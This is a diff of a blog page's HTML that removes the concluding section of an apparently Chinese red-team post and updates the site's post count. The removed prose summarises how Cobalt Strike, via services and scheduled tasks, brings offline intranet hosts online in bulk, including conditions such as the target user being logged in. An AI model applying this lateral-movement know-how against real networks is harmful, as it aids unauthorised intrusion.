-<p>​        <strong>使用计划任务有一个限制，就是我们启动计划任务的用户必须是在线的状态，如果是注销状态或者其他没有登录的状态，则无法正常上线。</strong></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过上面的学习总结，我们发现仅仅依托cobaltstrike再加上几条命令，即可完成批量上线内网断网主机的目的，需要注意的是使用service来批量横向生成的shell类型要使用service类型，计划任务上线需要目标用户处于登录状态。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1817,7 +1786,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-count">35</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
